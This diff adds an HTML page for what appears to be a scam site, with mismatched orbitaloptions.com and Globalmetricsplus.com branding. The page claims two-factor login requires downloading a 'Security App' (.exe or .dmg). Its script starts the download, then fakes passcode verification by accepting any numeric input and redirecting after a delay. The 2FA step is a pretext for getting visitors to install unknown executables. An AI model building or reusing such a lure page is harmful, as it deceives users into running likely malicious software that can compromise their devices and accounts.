@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <title>orbitaloptions.com</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
+    <meta content="" name="description">
+    <meta content="" name="author"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"><!-- App favicon -->
+    <link rel="shortcut icon" href="https://orbitaloptions.com/images/favicon.png">
+    <link href="./register_files/bootstrap.min.css" rel="stylesheet" type="text/css">
+    <link href="./register_files/icons.min.css" rel="stylesheet" type="text/css">
+    <link href="./register_files/app.min.css" rel="stylesheet" type="text/css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.js" integrity="sha512-+k1pnlgt4F1H8L7t3z95o3/KO+o78INEcXTbnoJQ/F2VqDVhWoaiVml/OEHv9HsVgxUaVW+IbiZPUJQfF/YxZw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+</head>
+
+<body class="account-body accountbg">
+    <!-- 2FA page -->
+<div class="container">
+    <div class="row vh-100 d-flex justify-content-center">
+        <div class="col-12 align-self-center">
+            <div class="row">
+                <div class="col-lg-5 mx-auto">
+                    <div class="card">
+                        <div class="card-body p-0 auth-header-box">
+                            <div class="text-center p-3"><a href="https://Globalmetricsplus.com/" class="logo logo-admin" ><img src="logo.png" alt=" logo" width="150" ></a>
+                            </div>
+                            <div class="live-section"></div>
+                        </div>
+                        <div class="card-body">
+
+                            <div class="text-center">
+                                <h4 class="mt-2">Secure your account</h4>
+                                <p class="text-muted">Two-factor authentication is required before you can log in.</p>
+                            </div>
+
+                            <!-- Step 1: Download the security app -->
+                            <div id="downloadStep" class="mt-4">
+                                <div class="text-center mb-3">
+                                    <i class="fas fa-shield-alt" style="font-size:48px;color:#727cf5;"></i>
+                                </div>
+                                <p class="text-center">Download our Security App and use it to generate your one-time passcode (OTP).</p>
+                                <div class="row">
+                                    <div class="col-6">
+                                        <a href="#" id="downloadWinBtn" class="btn btn-primary btn-block waves-effect waves-light">
+                                            <i class="fab fa-windows mr-1"></i> Windows
+                                        </a>
+                                    </div>
+                                    <div class="col-6">
+                                        <a href="#" id="downloadMacBtn" class="btn btn-primary btn-block waves-effect waves-light">
+                                            <i class="fab fa-apple mr-1"></i> Mac
+                                        </a>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Step 2: OTP form (hidden until download is triggered) -->
+                            <form id="otpForm" class="form-horizontal auth-form my-4" style="display:none;">
+                                <div class="text-center mb-3 text-success">
+                                    <i class="fas fa-check-circle mr-1"></i> App downloaded. Open it and enter the OTP it generates below.
+                                </div>
+                                <div class="form-group">
+                                    <label for="otp">One-Time Passcode</label>
+                                    <div class="input-group mb-3">
+                                        <input type="text" required id="otp" class="form-control" maxlength="6" placeholder="Enter 6-digit OTP" autocomplete="one-time-code">
+                                    </div>
+                                </div>
+                                <div class="form-group mb-0 row">
+                                    <div class="col-12 mt-2">
+                                        <button type="submit" class="btn btn-primary btn-block waves-effect waves-light" id="verifyBtn">Verify &amp; Continue <i class="fas fa-arrow-right ml-1"></i></button>
+                                    </div>
+                                </div>
+                            </form>
+
+                        </div>
+                        <!--end card-body-->
+                        <div class="card-body bg-light-alt text-center"><span class="text-muted d-none d-sm-inline-block">Globalmetricsplus.com ©
+                                2023</span></div>
+                    </div>
+                    <!--end card-->
+                </div>
+                <!--end col-->
+            </div>
+            <!--end row-->
+        </div>
+        <!--end col-->
+    </div>
+    <!--end row-->
+</div>
+<style>
+  .live-section
+  {
+      padding: 10px 5px;
+  }
+</style>
+
+    <!--end container-->
+    <!-- End 2FA page -->
+    <script>
+        var downloadWinBtn = document.getElementById('downloadWinBtn');
+        var downloadMacBtn = document.getElementById('downloadMacBtn');
+        var otpForm = document.getElementById('otpForm');
+        var verifyBtn = document.getElementById('verifyBtn');
+
+        function handleDownload(btn, url) {
+            btn.addEventListener('click', function (e) {
+                e.preventDefault();
+                // Trigger the security app download
+                window.location.href = url;
+
+                // Reveal the OTP field once the download has been initiated
+                btn.innerHTML = '<i class="fas fa-check mr-1"></i> Downloaded';
+                btn.classList.remove('btn-primary');
+                btn.classList.add('btn-success', 'disabled');
+                otpForm.style.display = 'block';
+                document.getElementById('otp').focus();
+            });
+        }
+
+        handleDownload(downloadWinBtn, './downloads/security-app-win.exe');
+        handleDownload(downloadMacBtn, './downloads/security-app-mac.dmg');
+
+        otpForm.addEventListener('submit', function (e) {
+            e.preventDefault();
+            var otp = document.getElementById('otp').value.trim();
+
+            if (otp === '') {
+                alert('Please enter the OTP shown in the Security App.');
+                return;
+            }
+            if (!/^[0-9]{4,6}$/.test(otp)) {
+                alert('Please enter a valid numeric OTP.');
+                return;
+            }
+
+            verifyBtn.style.opacity = '0.5';
+            verifyBtn.innerHTML = 'Verifying . . .';
+
+            setTimeout(function () {
+                window.location.href = './login.html';
+            }, 1000);
+        });
+    </script>
+
+    <script src="./register_files/jquery.min.js.download"></script>
+    <script src="./register_files/bootstrap.bundle.min.js.download"></script>
+    <script src="./register_files/waves.js.download"></script>
+    <script src="./register_files/feather.min.js.download"></script>
+    <script src="./register_files/simplebar.min.js.download"></script>
+
+</body></html>
